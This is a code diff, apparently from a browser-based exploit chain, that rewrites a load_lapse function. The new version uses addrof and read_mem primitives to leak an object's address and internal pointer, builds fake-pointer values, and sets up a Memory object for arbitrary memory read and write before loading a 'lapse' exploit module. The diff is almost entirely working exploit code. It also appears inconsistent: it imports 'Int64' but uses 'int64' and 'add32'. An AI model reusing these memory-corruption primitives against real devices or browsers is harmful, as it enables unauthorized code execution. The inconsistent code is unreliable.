@@ -551,7 +551,7 @@ function read64(addr) {
 }
 	
 	
- async function load_lapse(){
+/* async function load_lapse(){
  
   const mod = await import('./module/mem.mjs');
   const imod = await import('./module/int64.mjs');
@@ -576,7 +576,56 @@ new Memory(master_b, slave_b, obj, obj_p.add(0x10), obj_bt);
 
 
   import('./lapse.mjs');
+}*/
+
+
+async function load_lapse() {
+
+  const mod   = await import('./module/mem.mjs');
+  const Int64 = (await import('./module/int64.mjs')).Int;
+  const Memory = mod.Memory;
+
+
+  const obj = { addr: null, 0: 0 };
+
+
+  const rawPtr = window.addrof(obj);  
+
+
+  const leakBytes = window.read_mem(rawPtr + 8, 8);
+
+  const low  = (leakBytes[0]       |
+               (leakBytes[1] <<  8) |
+               (leakBytes[2] << 16) |
+               (leakBytes[3] << 24)) >>> 0;
+  const high = (leakBytes[4]       |
+               (leakBytes[5] <<  8) |
+               (leakBytes[6] << 16) |
+               (leakBytes[7] << 24)) >>> 0;
+
+
+  const obj_bt = new int64(low, high);
+
+
+  const obj_p_low  = rawPtr >>> 0;
+  const obj_p_high = (rawPtr / 0x100000000) >>> 0;
+  const obj_p = new int64(obj_p_low, obj_p_high);
+
+
+  const master_b = new Uint32Array(new ArrayBuffer(8));  
+  const slave_b  = new DataView   (new ArrayBuffer(8)); 
+  new Memory(
+    master_b,
+    slave_b,
+    obj,
+    obj_p.add32(0x10),  // offset 0x10 sul puntatore a obj
+    obj_bt
+  );
+
+
+  await import('./lapse.mjs');
 }
+	
     load_lapse();
     return;
 	
